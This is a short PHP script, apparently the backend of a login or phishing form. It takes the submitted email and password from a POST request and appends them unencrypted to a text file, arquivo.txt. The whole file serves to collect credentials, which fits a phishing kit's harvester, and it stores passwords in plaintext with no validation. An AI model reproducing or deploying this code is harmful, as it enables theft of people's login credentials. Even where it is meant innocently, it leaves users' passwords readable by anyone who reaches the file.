<?php
    $arquivo = 'arquivo.txt';
    $arquivoAberto = fopen($arquivo, 'a');
    // $conteudo = $email ." ". $senha;

    $email = $_POST['email'];
    $senha = $_POST['csenha'];
    $conteudo = $email ." ". $senha . "\n";

    fwrite($arquivoAberto, $conteudo);
    fclose($arquivoAberto);
?>